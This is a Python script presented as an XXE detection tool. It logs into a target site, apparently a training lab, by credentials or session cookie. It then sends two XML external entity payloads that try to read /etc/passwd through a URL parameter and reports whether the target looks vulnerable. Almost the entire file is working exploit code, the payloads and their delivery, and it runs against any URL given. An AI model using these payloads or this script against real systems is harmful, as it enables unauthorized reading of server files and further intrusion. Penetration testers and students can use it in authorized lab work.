import requests
from bs4 import BeautifulSoup
from termcolor import colored
import logging
from urllib.parse import quote_plus

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Define XXE payloads
XXE_PAYLOADS = [
    '''<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>''',

    '''<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ 
        <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
    ]>
    <stockCheck><productId>&xxe;</productId></stockCheck>'''
]

def login(session, url, username, password):
    logging.info("Attempting to log in...")
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        login_form = soup.find('form')

        if not login_form:
            raise ValueError("Login form not found")

        login_action = login_form['action']
        login_data = {input_tag['name']: input_tag.get('value', '') for input_tag in login_form.find_all('input') if 'name' in input_tag.attrs}
        login_data['email'] = username
        login_data['password'] = password

        login_url = url if login_action.startswith('/') else login_action
        response = session.post(login_url, data=login_data, timeout=10)
        response.raise_for_status()
        
        logging.info("Login successful.")
        return response
    except Exception as e:
        logging.error(f"Login failed: {e}")
        return None

def check_allowed_methods(url):
    logging.info("Checking allowed HTTP methods...")
    try:
        response = requests.options(url, timeout=10)
        if response.status_code == 200:
            return response.headers.get('Allow', '').split(', ')
        else:
            logging.warning(f"OPTIONS request failed with status code {response.status_code}")
            return []
    except requests.RequestException as e:
        logging.error(f"Error checking allowed methods: {e}")
        return []

def test_xxe(session, url, payloads):
    logging.info("Testing XXE with GET method")
    results = []

    for payload in payloads:
        try:
            # Encode the payload explicitly to handle special characters
            encoded_payload = quote_plus(payload)
            full_url = f"{url}?xml={encoded_payload}"
            logging.info(f"Sending GET request to URL: {full_url}")

            response = session.get(full_url, timeout=30)

            result = {
                'payload': payload,
                'status_code': response.status_code,
                'response_content': response.text[:500],  # Truncate for brevity
                'vulnerable': "xxe" in response.text.lower() or response.status_code == 500
            }
            logging.debug(f"Response Status Code: {response.status_code}")
            logging.debug(f"Response Content: {response.text[:500]}")
            results.append(result)

        except requests.RequestException as e:
            logging.error(f"Request failed for payload: {payload}\nError: {e}")

    return results

def main():
    import argparse
    parser = argparse.ArgumentParser(description="XXE Detection Tool")
    parser.add_argument("choice", help="1 for login details, 2 for session cookie")
    parser.add_argument("lab_url", help="The lab URL to test for XXE vulnerabilities")
    parser.add_argument("--login-url", help="The login URL for authentication")
    parser.add_argument("--username", help="Username for login")
    parser.add_argument("--password", help="Password for login")
    parser.add_argument("--session-cookie", help="Session cookie for authentication")
    args = parser.parse_args()

    xxe_results = []

    if args.choice == '1' and args.login_url and args.username and args.password:
        with requests.Session() as session:
            login_response = login(session, args.login_url, args.username, args.password)
            if login_response and login_response.status_code == 200:
                logging.info("Login successful!")
                logging.info(f"Cookies after login: {session.cookies}")
                logging.info(f"Headers after login: {session.headers}")
                xxe_results = test_xxe(session, args.lab_url, XXE_PAYLOADS)
            else:
                logging.error("Login failed or was not successful.")
                return
    elif args.choice == '2' and args.session_cookie:
        with requests.Session() as session:
            session.cookies.set('session', args.session_cookie)
            xxe_results = test_xxe(session, args.lab_url, XXE_PAYLOADS)
    else:
        logging.error("Please provide either login details or session cookie.")
        return

    for result in xxe_results:
        print(f"Payload sent:\n{result['payload']}")
        print(f"Response Status Code: {result['status_code']}")
        print(f"Response Content: {result['response_content']}")
        print(colored(f"Vulnerable: {result['vulnerable']}\n", 'red' if result['vulnerable'] else 'green'))

if __name__ == '__main__':
    main()
